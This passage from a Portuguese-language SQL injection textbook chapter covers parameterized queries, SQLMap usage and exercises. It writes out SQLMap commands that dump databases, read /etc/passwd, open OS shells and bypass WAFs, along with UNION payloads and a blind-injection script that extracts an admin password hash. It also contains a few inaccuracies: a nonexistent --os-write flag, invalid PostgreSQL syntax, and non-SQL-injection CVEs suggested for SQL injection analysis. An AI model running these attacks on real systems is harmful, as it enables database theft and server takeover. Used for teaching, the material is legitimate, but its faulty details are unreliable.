        {"status": status}
    )
    return result.fetchall()

# Exemplo 3: MySQL com mysql-connector-python
import mysql.connector
from mysql.connector import pooling

# Pool de conexoes
db_config = {
    "host": "localhost",
    "user": "app_user",
    "password": "secure_password",
    "database": "meu_banco",
    "pool_name": "mypool",
    "pool_size": 10
}

connection_pool = mysql.connector.pooling.MySQLConnectionPool(**db_config)

def buscar_usuarios_mysql(status, limite):
    conn = connection_pool.get_connection()
    cur = conn.cursor()
    
    # MySQL usa %s para placeholders
    cur.execute(
        "SELECT id, nome, email FROM usuarios WHERE status = %s LIMIT %s",
        (status, limite)
    )
    
    result = cur.fetchall()
    cur.close()
    conn.close()
    return result
```

### Go

**Exemplos Completos de Parameterized Queries:**

```go
package main

import (
    "database/sql"
    "fmt"
    "log"
    
    _ "github.com/lib/pq"
)

type Usuario struct {
    ID        int
    Nome      string
    Email     string
    Status    string
}

// Conexao com o banco de dados
func conectarDB() (*sql.DB, error) {
    connStr := "host=localhost user=app_user password=secure_password dbname=meu_banco sslmode=disable"
    db, err := sql.Open("postgres", connStr)
    if err != nil {
        return nil, err
    }
    
    // Configurar pool
    db.SetMaxOpenConns(25)
    db.SetMaxIdleConns(5)
    
    return db, nil
}

// SELECT parameterizado
func buscarUsuarios(db *sql.DB, status string, limite int) ([]Usuario, error) {
    var usuarios []Usuario
    
    // PostgreSQL usa $1, $2, etc.
    rows, err := db.Query(
        "SELECT id, nome, email FROM usuarios WHERE status = $1 LIMIT $2",
        status, limite,
    )
    if err != nil {
        return nil, err
    }
    defer rows.Close()
    
    for rows.Next() {
        var u Usuario
        if err := rows.Scan(&u.ID, &u.Nome, &u.Email); err != nil {
            return nil, err
        }
        usuarios = append(usuarios, u)
    }
    
    return usuarios, nil
}

// INSERT parameterizado
func criarUsuario(db *sql.DB, u Usuario) (int64, error) {
    var id int64
    
    err := db.QueryRow(
        `INSERT INTO usuarios (nome, email, status) 
         VALUES ($1, $2, $3) 
         RETURNING id`,
        u.Nome, u.Email, u.Status,
    ).Scan(&id)
    
    return id, err
}

// UPDATE parameterizado
func atualizarUsuario(db *sql.DB, id int, u Usuario) error {
    _, err := db.Exec(
        `UPDATE usuarios 
         SET nome = $1, email = $2, status = $3, updated_at = CURRENT_TIMESTAMP
         WHERE id = $4`,
        u.Nome, u.Email, u.Status, id,
    )
    return err
}

// DELETE parameterizado
func deletarUsuario(db *sql.DB, id int) error {
    _, err := db.Exec("DELETE FROM usuarios WHERE id = $1", id)
    return err
}

// Prepared Statement
func buscarPorStatus(db *sql.DB, status string) ([]Usuario, error) {
    var usuarios []Usuario
    
    // Preparar statement
    stmt, err := db.Prepare(
        "SELECT id, nome, email FROM usuarios WHERE status = $1",
    )
    if err != nil {
        return nil, err
    }
    defer stmt.Close()
    
    // Executar multiplas vezes
    rows, err := stmt.Query(status)
    if err != nil {
        return nil, err
    }
    defer rows.Close()
    
    for rows.Next() {
        var u Usuario
        if err := rows.Scan(&u.ID, &u.Nome, &u.Email); err != nil {
            return nil, err
        }
        usuarios = append(usuarios, u)
    }
    
    return usuarios, nil
}

// Transaction
func transferirPontos(db *sql.DB, deID, paraID, pontos int) error {
    tx, err := db.Begin()
    if err != nil {
        return err
    }
    defer tx.Rollback()
    
    // Debitar
    _, err = tx.Exec(
        "UPDATE usuarios SET pontos = pontos - $1 WHERE id = $2",
        pontos, deID,
    )
    if err != nil {
        return err
    }
    
    // Creditar
    _, err = tx.Exec(
        "UPDATE usuarios SET pontos = pontos + $1 WHERE id = $2",
        pontos, paraID,
    )
    if err != nil {
        return err
    }
    
    return tx.Commit()
}

// QueryRow para buscar um registro
func buscarPorID(db *sql.DB, id int) (*Usuario, error) {
    var u Usuario
    
    err := db.QueryRow(
        "SELECT id, nome, email, status FROM usuarios WHERE id = $1",
        id,
    ).Scan(&u.ID, &u.Nome, &u.Email, &u.Status)
    
    if err == sql.ErrNoRows {
        return nil, nil
    }
    if err != nil {
        return nil, err
    }
    
    return &u, nil
}

// Exemplo de uso completo
func main() {
    db, err := conectarDB()
    if err != nil {
        log.Fatal(err)
    }
    defer db.Close()
    
    // Criar usuario
    novoUsuario := Usuario{
        Nome:   "Joao Silva",
        Email:  "joao@exemplo.com",
        Status: "ativo",
    }
    
    id, err := criarUsuario(db, novoUsuario)
    if err != nil {
        log.Fatal(err)
    }
    fmt.Printf("Usuario criado com ID: %d\n", id)
    
    // Buscar usuarios
    usuarios, err := buscarUsuarios(db, "ativo", 10)
    if err != nil {
        log.Fatal(err)
    }
    fmt.Printf("Encontrados %d usuarios\n", len(usuarios))
    
    // Atualizar usuario
    novoUsuario.Nome = "Joao Santos"
    err = atualizarUsuario(db, int(id), novoUsuario)
    if err != nil {
        log.Fatal(err)
    }
    
    // Deletar usuario
    err = deletarUsuario(db, int(id))
    if err != nil {
        log.Fatal(err)
    }
}
```

### Tabela Comparativa de Placeholders

| Linguagem/Driver | Placeholder | Exemplo |
|-----------------|-------------|---------|
| MySQL (Node.js) | `?` | `WHERE id = ?` |
| PostgreSQL (Node.js) | `$1, $2, ...` | `WHERE id = $1` |
| PostgreSQL (Python) | `%s` | `WHERE id = %s` |
| MySQL (Python) | `%s` | `WHERE id = %s` |
| PostgreSQL (Go) | `$1, $2, ...` | `WHERE id = $1` |
| MySQL (Go) | `?` | `WHERE id = ?` |
| SQLite (todos) | `?` | `WHERE id = ?` |

### Melhores Praticas

1. **Sempre usar parameterized queries** - Nunca concatenar strings
2. **Usar pools de conexoes** - Melhor performance e controle
3. **Implementar timeouts** - Evitar queries longas
4. **Tratar erros adequadamente** - Nao expor detalhes de erro
5. **Usar ORM quando possivel** - Facilita a parameterizacao
6. **Validar inputs** - Mesmo com parameterizacao
7. **Logging seguro** - Nunca logar queries com dados sensiveis
8. **Testes automatizados** - Verificar ausencia de SQL injection

---

## SQLMap — Uso para Testes

### Visao Geral

SQLMap e uma ferramenta de codigo aberto para automacao de deteccao e exploracao de SQL injection. E amplamente utilizada por profissionais de seguranca para testes autorizados.

**Aviso Legal:** SQLMap deve ser usado apenas em sistemas para os quais voce tem autorizacao explicita para testar. O uso nao autorizado e ilegal e anti-etico.

### Instalacao

```bash
# Instalar SQLMap via Git
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Ou via gerenciador de pacotes
# Ubuntu/Debian
sudo apt install sqlmap

# Kali Linux (ja instalado)
sqlmap --version

# Verificar instalacao
python sqlmap.py --version
```

### Comandos Basicos

**Reconhecimento:**

```bash
# Verificar URL por SQL injection basica
python sqlmap.py -u "http://exemplo.com/produto?id=1" --batch

# Testar com cookies
python sqlmap.py -u "http://exemplo.com/produto?id=1" --cookie="session=abc123" --batch

# Testar com POST data
python sqlmap.py -u "http://exemplo.com/login" --data="username=admin&password=123" --batch

# Testar com headers customizados
python sqlmap.py -u "http://exemplo.com/api" --headers="Authorization: Bearer token123" --batch
```

**Nivel de Teste:**

```bash
# Nivel 1: Testes basicos (padrao)
python sqlmap.py -u "http://exemplo.com/produto?id=1" --level=1

# Nivel 2: Testes com cookies
python sqlmap.py -u "http://exemplo.com/produto?id=1" --level=2 --cookie="session=abc"

# Nivel 3: Testes com User-Agent
python sqlmap.py -u "http://exemplo.com/produto?id=1" --level=3 --random-agent

# Nivel 4: Testes com referer
python sqlmap.py -u "http://exemplo.com/produto?id=1" --level=4

# Nivel 5: Testes extremos
python sqlmap.py -u "http://exemplo.com/produto?id=1" --level=5
```

**Extrair Dados:**

```bash
# Listar bancos de dados
python sqlmap.py -u "http://exemplo.com/produto?id=1" --dbs

# Listar tabelas de um banco
python sqlmap.py -u "http://exemplo.com/produto?id=1" -D meu_banco --tables

# Listar colunas de uma tabela
python sqlmap.py -u "http://exemplo.com/produto?id=1" -D meu_banco -T usuarios --columns

# Dump de uma tabela
python sqlmap.py -u "http://exemplo.com/produto?id=1" -D meu_banco -T usuarios --dump

# Dump de colunas especificas
python sqlmap.py -u "http://exemplo.com/produto?id=1" -D meu_banco -T usuarios -C "nome,email" --dump

# Dump de todos os bancos
python sqlmap.py -u "http://exemplo.com/produto?id=1" --dump-all
```

**Tecnicas Avancadas:**

```bash
# Usar tecnica especifica
python sqlmap.py -u "http://exemplo.com/produto?id=1" --technique=U  # UNION-based
python sqlmap.py -u "http://exemplo.com/produto?id=1" --technique=E  # Error-based
python sqlmap.py -u "http://exemplo.com/produto?id=1" --technique=B  # Boolean-based
python sqlmap.py -u "http://exemplo.com/produto?id=1" --technique=T  # Time-based
python sqlmap.py -u "http://exemplo.com/produto?id=1" --technique=S  # Stacked queries

# Combinar tecnicas
python sqlmap.py -u "http://exemplo.com/produto?id=1" --technique=BEUST

# Bypass de WAF/IPS
python sqlmap.py -u "http://exemplo.com/produto?id=1" --tamper=space2comment
python sqlmap.py -u "http://exemplo.com/produto?id=1" --tamper=charencode
python sqlmap.py -u "http://exemplo.com/produto?id=1" --random-agent --delay=1

# Usar proxy
python sqlmap.py -u "http://exemplo.com/produto?id=1" --proxy="http://127.0.0.1:8080"

# Tor network
python sqlmap.py -u "http://exemplo.com/produto?id=1" --tor --check-tor
```

**Escrita e Leitura:**

```bash
# Escrever arquivo no servidor (requer DBA)
python sqlmap.py -u "http://exemplo.com/produto?id=1" --os-write="/tmp/teste.txt"

# Ler arquivo do servidor
python sqlmap.py -u "http://exemplo.com/produto?id=1" --file-read="/etc/passwd"

# Executar comando do SO (requer DBA)
python sqlmap.py -u "http://exemplo.com/produto?id=1" --os-shell

# PowerShell no Windows
python sqlmap.py -u "http://exemplo.com/produto?id=1" --os-pwn
```

### Scripts Customizados

**Arquivo de requisicao:**

```bash
# Criar arquivo de requisicao
cat > request.txt << 'EOF'
POST /api/login HTTP/1.1
Host: exemplo.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

{"username": "admin", "password": "test"}
EOF

# Usar arquivo de requisicao
python sqlmap.py -r request.txt --batch

# Com opcoes especificas
python sqlmap.py -r request.txt --level=3 --risk=2 --batch
```

**Tamper scripts:**

```bash
# Listar tamper scripts disponiveis
python sqlmap.py --list-tamper

# Usar multiplos tamper scripts
python sqlmap.py -u "http://exemplo.com/produto?id=1" \
    --tamper=space2comment,charencode,between

# Criar tamper script customizado (Python)
cat > tamper/custom_tamper.py << 'EOF'
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    # Substituir espacos por comentarios SQL
    payload = payload.replace(" ", "/**/")
    return payload
EOF

# Usar tamper script customizado
python sqlmap.py -u "http://exemplo.com/produto?id=1" --tamper=custom_tamper
```

### Automacao e Integracao

**Script de teste automatizado:**

```bash
#!/bin/bash
# sqlmap_scan.sh - Script de automacao SQLMap

URL="$1"
OUTPUT_DIR="./sqlmap_results/$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT_DIR"

echo "Iniciando scan em: $URL"
echo "Resultados em: $OUTPUT_DIR"

# Scan basico
python sqlmap.py -u "$URL" \
    --batch \
    --output-dir="$OUTPUT_DIR" \
    --forms \
    --crawl=2 \
    --level=3 \
    --risk=2 \
    --random-agent \
    --threads=4

# Extrair dados se vulneravel
if [ -f "$OUTPUT_DIR/log" ]; then
    if grep -q "is vulnerable" "$OUTPUT_DIR/log"; then
        echo "Vulnerabilidade encontrada! Extraindo dados..."
        
        python sqlmap.py -u "$URL" \
            --batch \
            --output-dir="$OUTPUT_DIR" \
            --dbs
        
        python sqlmap.py -u "$URL" \
            --batch \
            --output-dir="$OUTPUT_DIR" \
            --dump-all \
            --exclude-sysdb
    fi
fi

echo "Scan completo. Verifique: $OUTPUT_DIR"
```

**Integracao com CI/CD:**

```yaml
# Exemplo de pipeline GitLab CI
sqlmap_scan:
  stage: security
  image: python:3.9
  script:
    - pip install sqlmap
    - |
      python sqlmap.py -u "$TEST_URL" \
        --batch \
        --level=2 \
        --risk=1 \
        --timeout=30 \
        --retries=3 \
        --output-dir=./sqlmap_results
    - |
      if grep -q "is vulnerable" ./sqlmap_results/*/log; then
        echo "SQL INJECTION FOUND!"
        exit 1
      fi
  artifacts:
    when: always
    paths:
      - ./sqlmap_results/
  only:
    - security_scan
```

### Relatorios e Analise

```bash
# Gerar relatorio em JSON
python sqlmap.py -u "http://exemplo.com/produto?id=1" --output-dir=./report --forms

# Relatorio em HTML (usando ferramentas externas)
# Extrair dados e gerar relatorio personalizado

# Analisar log do SQLMap
cat ./report/*/log | grep -E "(vulnerable|payload|injection)"

# Extrair payloads usados
grep -r "Payload:" ./report/ | head -20
```

### Melhores Praticas com SQLMap

1. **Sempre ter autorizacao** - Nunca testar sem permissao explicita
2. **Usar em ambiente controlado** - Testar em staging antes de producao
3. **Limitar intensidade** - Comecar com level=1, risk=1
4. **Monitorar performance** - SQLMap pode sobrecarregar o alvo
5. **Usar proxy** - Para logging e analise
6. **Salvar resultados** - Para documentacao e retestes
7. **Combinar com outras ferramentas** - Burp Suite, OWASP ZAP
8. **Automatizar** - Integrar em pipelines de seguranca

---

## Exercicios

### Exercicio 1: Identificacao de SQL Injection (Basico)

**Objetivo:** Identificar e explorar uma vulnerabilidade SQL injection basica.

**Cenario:** Voce encontrou uma pagina de busca de produtos em um site de e-commerce que aceita o parametro `q` para busca.

**Tarefa:**
1. Identificar se a aplicacao e vulneravel a SQL injection
2. Determinar o numero de colunas na consulta original
3. Extrair o nome do banco de dados atual
4. Listar todas as tabelas do banco de dados

**Dicas:**
```bash
# Testar vulnerabilidade basica
curl "http://exemplo.com/busca?q=teste'"

# Testar com UNION
curl "http://exemplo.com/busca?q=teste' UNION SELECT 1--"

# Extrair banco de dados
curl "http://exemplo.com/busca?q=teste' UNION SELECT database()--"
```

**Questoes:**
1. Como voce confirmou que a aplicacao e vulneravel?
2. Qual foi o numero de colunas encontrado?
3. Qual o nome do banco de dados?
4. Quais tabelas foram encontradas?

### Exercicio 2: Blind SQL Injection (Intermediario)

**Objetivo:** Extrair dados usando blind SQL injection.

**Cenario:** Uma aplicacao de login retorna apenas "Login bem-sucedido" ou "Falha no login", sem erros detalhados.

**Tarefa:**
1. Confirmar a vulnerabilidade usando boolean-based blind
2. Extrair o nome do usuario administrador
3. Extrair o hash da senha do administrador
4. Determinar o comprimento do hash

**Script para auxiliar:**
```python
import requests

def extract_char(url, position, charset='abcdefghijklmnopqrstuvwxyz0123456789'):
    for char in charset:
        payload = f"admin' AND SUBSTRING(password,{position},1)='{char}'--"
        response = requests.post(url, data={
            'username': payload,
            'password': 'anything'
        })
        if 'Login bem-sucedido' in response.text:
            return char
    return None

def extract_password(url):
    password = ''
    for i in range(1, 33):  # MD5 tem 32 caracteres
        char = extract_char(url, i)
        if char:
            password += char
            print(f"Posicao {i}: {char}")
        else:
            break
    return password

# Uso
# password = extract_password('http://exemplo.com/login')
# print(f"Senha: {password}")
```

**Questoes:**
1. Quantas requisicoes foram necessarias para extrair o hash completo?
2. Como voce otimizaria o script para ser mais eficiente?
3. Qual e a vantagem do time-based blind sobre o boolean-based?

### Exercicio 3: Parameterized Queries (Pratico)

**Objetivo:** Refatorar codigo vulneravel para usar parameterized queries.

**Codigo Vulneravel:**
```python
# Codigo com SQL injection
def buscar_usuario(nome):
    query = "SELECT * FROM usuarios WHERE nome = '" + nome + "'"
    cursor.execute(query)
    return cursor.fetchall()

def inserir_usuario(nome, email, senha):
    query = "INSERT INTO usuarios (nome, email, senha) VALUES ('" + nome + "', '" + email + "', '" + senha + "')"
    cursor.execute(query)
```

**Tarefa:**
1. Reescrever as funcoes usando parameterized queries em Python (psycopg2)
2. Implementar as mesmas funcoes em Node.js (mysql2)
3. Implementar as mesmas funcoes em Go (database/sql)

**Solucao esperada:**
```python
# Python com psycopg2
def buscar_usuario_seguro(nome):
    cursor.execute("SELECT * FROM usuarios WHERE nome = %s", (nome,))
    return cursor.fetchall()

def inserir_usuario_seguro(nome, email, senha):
    cursor.execute(
        "INSERT INTO usuarios (nome, email, senha) VALUES (%s, %s, %s)",
        (nome, email, senha)
    )
```

**Questoes:**
1. Qual a diferenca entre `%s` no psycopg2 e `?` no mysql2?
2. Por que parameterized queries previnem SQL injection?
3. Em quais cenarios parameterized queries nao sao suficientes?

### Exercicio 4: NoSQL Injection (Avancado)

**Objetivo:** Explorar e prevenir NoSQL injection em uma aplicacao MongoDB.

**Cenario:** Uma aplicacao Node.js usa MongoDB para armazenar usuarios. A funcao de login e:

```javascript
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    const user = await db.collection('users').findOne({
        username: username,
        password: password
    });
    
    if (user) {
        res.json({ success: true, user });
    } else {
        res.json({ success: false });
    }
});
```

**Tarefa:**
1. Demonstrar como explorar essa vulnerabilidade
2. Criar payload que retorne todos os usuarios
3. Reescrever a funcao de login de forma segura
4. Implementar validacao de tipos

**Solucao segura:**
```javascript
// Versao segura
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // Validacao de tipos
    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).json({ error: 'Tipos invalidos' });
    }
    
    // Sanitizacao
    const sanitize = require('mongo-sanitize');
    const cleanUsername = sanitize(username);
    const cleanPassword = sanitize(password);
    
    const user = await db.collection('users').findOne({
        username: cleanUsername,
        password: cleanPassword
    });
    
    if (user) {
        res.json({ success: true, user });
    } else {
        res.json({ success: false });
    }
});
```

**Questoes:**
1. Por que a validacao de tipos e importante mesmo com parameterized queries?
2. Qual a diferenca entre SQL injection e NoSQL injection?
3. Como o mongo-sanitize funciona internamente?

### Exercicio 5: Stored Procedures Seguras (Avancado)

**Objetivo:** Implementar stored procedures seguras para operacoes CRUD.

**Cenario:** Voce precisa criar stored procedures para uma aplicacao de gestao de usuarios em PostgreSQL.

**Tarefa:**
1. Criar stored procedure para inserir usuario com validacao
2. Criar stored procedure para buscar usuario por email
3. Criar stored procedure para atualizar perfil
4. Criar stored procedure para deletar usuario (soft delete)
5. Implementar auditoria em todas as operacoes

**Solucao:**
```sql
-- 1. Tabela de auditoria
CREATE TABLE audit_log (
    id SERIAL PRIMARY KEY,
    tabela VARCHAR(100),
    operacao VARCHAR(10),
    usuario_id INT,
    dados_antes JSONB,
    dados_depois JSONB,
    ip_address INET,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 2. Stored procedure para inserir usuario
CREATE OR REPLACE FUNCTION inserir_usuario(
    p_nome VARCHAR,
    p_email VARCHAR,
    p_senha VARCHAR
) RETURNS INT AS $$
DECLARE
    v_id INT;
BEGIN
    -- Validacoes
    IF p_nome IS NULL OR length(p_nome) < 2 THEN
        RAISE EXCEPTION 'Nome invalido';
    END IF;
    
    IF p_email !~ '^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$' THEN
        RAISE EXCEPTION 'Email invalido';
    END IF;
    
    IF length(p_senha) < 8 THEN
        RAISE EXCEPTION 'Senha deve ter pelo menos 8 caracteres';
    END IF;
    
    -- Verificar se email ja existe
    IF EXISTS (SELECT 1 FROM usuarios WHERE email = p_email) THEN
        RAISE EXCEPTION 'Email ja cadastrado';
    END IF;
    
    -- Inserir
    INSERT INTO usuarios (nome, email, senha_hash, status, created_at)
    VALUES (p_nome, p_email, crypt(p_senha, gen_salt('bf')), 'ativo', NOW())
    RETURNING id INTO v_id;
    
    -- Auditoria
    INSERT INTO audit_log (tabela, operacao, usuario_id, dados_depois)
    VALUES ('usuarios', 'INSERT', v_id, jsonb_build_object('nome', p_nome, 'email', p_email));
    
    RETURN v_id;
END;
$$ LANGUAGE plpgsql;

-- 3. Stored procedure para buscar por email
CREATE OR REPLACE FUNCTION buscar_por_email(p_email VARCHAR)
RETURNS TABLE(id INT, nome VARCHAR, email VARCHAR, status VARCHAR) AS $$
BEGIN
    RETURN QUERY
    SELECT u.id, u.nome, u.email, u.status
    FROM usuarios u
    WHERE u.email = p_email;
END;
$$ LANGUAGE plpgsql;

-- 4. Stored procedure para atualizar
CREATE OR REPLACE FUNCTION atualizar_usuario(
    p_id INT,
    p_nome VARCHAR,
    p_email VARCHAR
) RETURNS BOOLEAN AS $$
DECLARE
    v_antes JSONB;
BEGIN
    -- Buscar dados antes da atualizacao
    SELECT row_to_json(u)::jsonb INTO v_antes
    FROM usuarios u WHERE u.id = p_id;
    
    IF v_antes IS NULL THEN
        RAISE EXCEPTION 'Usuario nao encontrado';
    END IF;
    
    -- Validacoes
    IF p_nome IS NULL OR length(p_nome) < 2 THEN
        RAISE EXCEPTION 'Nome invalido';
    END IF;
    
    IF p_email !~ '^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$' THEN
        RAISE EXCEPTION 'Email invalido';
    END IF;
    
    -- Atualizar
    UPDATE usuarios 
    SET nome = p_nome, email = p_email, updated_at = NOW()
    WHERE id = p_id;
    
    -- Auditoria
    INSERT INTO audit_log (tabela, operacao, usuario_id, dados_antes, dados_depois)
    VALUES ('usuarios', 'UPDATE', p_id, v_antes, jsonb_build_object('nome', p_nome, 'email', p_email));
    
    RETURN TRUE;
END;
$$ LANGUAGE plpgsql;

-- 5. Stored procedure para soft delete
CREATE OR REPLACE FUNCTION deletar_usuario(p_id INT)
RETURNS BOOLEAN AS $$
DECLARE
    v_antes JSONB;
BEGIN
    -- Buscar dados antes da exclusao
    SELECT row_to_json(u)::jsonb INTO v_antes
    FROM usuarios u WHERE u.id = p_id;
    
    IF v_antes IS NULL THEN
        RAISE EXCEPTION 'Usuario nao encontrado';
    END IF;
    
    -- Soft delete
    UPDATE usuarios 
    SET status = 'inativo', deleted_at = NOW()
    WHERE id = p_id;
    
    -- Auditoria
    INSERT INTO audit_log (tabela, operacao, usuario_id, dados_antes)
    VALUES ('usuarios', 'DELETE', p_id, v_antes);
    
    RETURN TRUE;
END;
$$ LANGUAGE plpgsql;
```

**Questoes:**
1. Por que usar crypt() em vez de hash simples para senhas?
2. Qual a vantagem do soft delete sobre o hard delete?
3. Como voce implementaria auditoria de quem executou a operacao?

### Exercicio 6: Database Hardening (Avancado)

**Objetivo:** Implementar database hardening completo para um ambiente de producao.

**Cenario:** Voce e responsavel por asegurar um banco de dados PostgreSQL que armazena dados sensiveis de uma empresa de saude.

**Tarefa:**
1. Configurar roles com principio do menor privilegio
2. Habilitar criptografia em repouso para colunas sensiveis
3. Implementar auditoria completa
4. Configurar backup seguro com criptografia
5. Criar script de verificacao de seguranca

**Solucao:**
```sql
-- 1. Criar roles
CREATE ROLE app_readonly;
CREATE ROLE app_readwrite;
CREATE ROLE app_admin;
CREATE ROLE backup_role;

-- Permissoes
GRANT CONNECT ON DATABASE saude TO app_readonly;
GRANT USAGE ON SCHEMA public TO app_readonly;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO app_readonly;

GRANT app_readonly TO app_readwrite;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_readwrite;

GRANT ALL PRIVILEGES ON DATABASE saude TO app_admin;
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO app_admin;

-- Backup
GRANT CONNECT ON DATABASE saude TO backup_role;
GRANT USAGE ON SCHEMA public TO backup_role;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO backup_role;

-- 2. Criptografia de colunas
CREATE EXTENSION IF NOT EXISTS pgcrypto;

-- Tabela com colunas criptografadas
CREATE TABLE pacientes (
    id SERIAL PRIMARY KEY,
    nome VARCHAR(100),
    cpf VARCHAR(14) ENCRYPTED,  -- Requer extensao
    dados_sensiveis BYTEA,  -- Criptografado com pgcrypto
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Funcoes de criptografia
CREATE OR REPLACE FUNCTION criptografar(texto TEXT, chave TEXT)
RETURNS BYTEA AS $$
BEGIN
    RETURN pgp_sym_encrypt(texto, chave);
END;
$$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION descriptografar(dados BYTEA, chave TEXT)
RETURNS TEXT AS $$
BEGIN
    RETURN pgp_sym_decrypt(dados, chave);
END;
$$ LANGUAGE plpgsql;

-- 3. Auditoria (ja implementada no exercicio anterior)

-- 4. Backup seguro (script bash)
-- Ver secao anterior sobre backup seguro

-- 5. Script de verificacao
CREATE OR REPLACE FUNCTION verificar_seguranca()
RETURNS TABLE(check_item VARCHAR, status VARCHAR, detalhes TEXT) AS $$
BEGIN
    -- Verificar versao
    RETURN QUERY
    SELECT 
        'Versao PostgreSQL'::VARCHAR,
        CASE WHEN version() LIKE '%14.%' OR version() LIKE '%15.%' THEN 'OK' ELSE 'ATUALIZAR' END,
        version()::TEXT;
    
    -- Verificar superusers
    RETURN QUERY
    SELECT 
        'Superusers'::VARCHAR,
        CASE WHEN COUNT(*) <= 1 THEN 'OK' ELSE 'ATENCAO' END,
        STRING_AGG(usename, ', ')
    FROM pg_user WHERE usesuper = true;
    
    -- Verificar SSL
    RETURN QUERY
    SELECT 
        'SSL Habilitado'::VARCHAR,
        CASE WHEN current_setting('ssl') = 'on' THEN 'OK' ELSE 'CRITICO' END,
        current_setting('ssl');
    
    -- Verificar log de conexoes
    RETURN QUERY
    SELECT 
        'Log de Conexoes'::VARCHAR,
        CASE WHEN current_setting('log_connections') = 'on' THEN 'OK' ELSE 'ATENCAO' END,
        current_setting('log_connections');
    
    -- Verificar timeout
    RETURN QUERY
    SELECT 
        'Statement Timeout'::VARCHAR,
        CASE WHEN current_setting('statement_timeout') != '0' THEN 'OK' ELSE 'ATENCAO' END,
        current_setting('statement_timeout');
    
    RETURN;
END;
$$ LANGUAGE plpgsql;

-- Executar verificacao
SELECT * FROM verificar_seguranca();
```

**Questoes:**
1. Por que o SSL e importante para conexoes de banco de dados?
2. Como voce implementaria rotacao de chaves de criptografia?
3. Qual a estrategia de backup 3-2-1 e como apply-la?

### Exercicio 7: CVE Analysis (Pesquisa)

**Objetivo:** Analisar uma CVE de SQL injection e propor contramedidas.

**Tarefa:**
1. Escolher uma CVE de SQL injection diferente das cobertas neste capitulo
2. Pesquisar detalhes tecnicos da vulnerabilidade
3. Analisar o codigo vulneravel
4. Propor codigo corrigido
5. Criar plano de mitigacao

**Sugestoes de CVEs:**
- CVE-2021-44228 (Log4Shell) - nao e SQL injection, mas relacionado a injecao
- CVE-2017-5638 (Apache Struts)
- CVE-2019-11510 (Pulse Secure VPN)
- CVE-2020-1472 (Zerologon)

**Formato de entrega:**
```
# Analise CVE-XXXX-XXXXX

## Resumo
[Descricao da vulnerabilidade]

## Classificacao CVSS
[Score e vetor]

## Detalhes Tecnicos
[Analise do codigo vulneravel]

## Codigo Vulneravel
[Codigo de exemplo]

## Codigo Corrigido
[Codigo corrigido]

## Mitigacoes
[Plano de acao]

## Referencias
[Links para fontes]
```

---

## Referencias

### Livros e Artigos

1. Stuttard, D., & Pinto, M. (2021). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws*. Wiley.

2. Clarke, J. (2012). *SQL Injection Attacks and Defense*. Syngress.

3. Halfond, W. G., Viegas, J., & Orso, A. (2006). A Classification of SQL Injection Attacks and Countermeasures. *Proceedings of the IEEE International Symposium on Secure Software Engineering*.

4. Su, Z., & Wassermann, G. (2006). The Essence of Command Injection Attacks in Web Applications. *Proceedings of the 33rd ACM SIGPLAN-SIGACT Symposium on Principles of Programming Languages*.

5. OWASP Foundation. (2021). *OWASP Top Ten*. https://owasp.org/www-project-top-ten/

### Documentacao de Bancos de Dados

6. PostgreSQL Documentation. (2023). *SQL Command Reference*. https://www.postgresql.org/docs/current/sql-commands.html

7. MySQL Documentation. (2023). *SQL Syntax Reference*. https://dev.mysql.com/doc/refman/8.0/en/sql-syntax.html

8. MongoDB Documentation. (2023). *Security Best Practices*. https://www.mongodb.com/docs/manual/security/

### Ferramentas

9. SQLMap Project. (2023). *Automatic SQL injection and database takeover tool*. https://sqlmap.org/

10. OWASP ZAP. (2023). *Zed Attack Proxy*. https://www.zaproxy.org/

11. Burp Suite. (2023). *Web Security Testing Tool*. https://portswigger.net/burp

### CVEs e Vulnerabilidades

12. MITRE Corporation. (2023). *CVE-2023-34362*. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34362

13. MITRE Corporation. (2019). *CVE-2019-9193*. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9193

14. MITRE Corporation. (2012). *CVE-2012-2122*. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2122

### Guias e Boas Praticas

15. NIST. (2020). *SP 800-53 Rev. 5: Security and Privacy Controls for Information Systems and Organizations*. https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final

16. SANS Institute. (2023). *SQL Injection Prevention Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

17. CIS Benchmarks. (2023). *CIS PostgreSQL Benchmark*. https://www.cisecurity.org/benchmark/postgresql

### Comunidades e Foruns

18. Stack Overflow. (2023). *SQL Injection Questions*. https://stackoverflow.com/questions/tagged/sql-injection

19. Reddit. (2023). *r/netsec*. https://www.reddit.com/r/netsec/

20. Security Stack Exchange. (2023). *SQL Injection Discussions*. https://security.stackexchange.com/questions/tagged/sql-injection

---

## Glossario

- **Blind SQL Injection:** Tipo de ataque onde o atacante nao recebe resultados diretos da consulta injetada
- **CEH (Certified Ethical Hacker):** Certificacao profissional em seguranca cibernetica
- **CVE (Common Vulnerabilities and Exposures):** Sistema de identificacao de vulnerabilidades
- **CVSS (Common Vulnerability Scoring System):** Sistema de pontuacao de severidade de vulnerabilidades
- **CTE (Common Table Expression):** Consulta temporaria definida dentro de outra consulta SQL
- **DBA (Database Administrator):** Administrador de banco de dados
- **Encryption at Rest:** Criptografia de dados armazenados em disco
- **LDAP (Lightweight Directory Access Protocol):** Protocolo para servicos de diretorio
